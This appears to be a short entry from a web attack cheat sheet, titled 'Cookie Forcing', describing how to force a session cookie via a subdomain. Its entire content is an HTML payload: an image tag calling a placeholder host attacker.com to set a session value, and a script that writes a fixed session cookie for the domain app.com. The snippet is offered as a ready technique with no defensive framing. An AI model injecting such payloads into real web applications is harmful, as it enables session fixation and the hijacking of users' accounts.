# Cookie Forcing

## Summary
Force a session cookie via subdomain.

## Technique
```html
<img src="https://attacker.com/setcookie?name=session&value=abc123">
<script>
document.cookie = "session=abc123; domain=app.com";
</script>
```
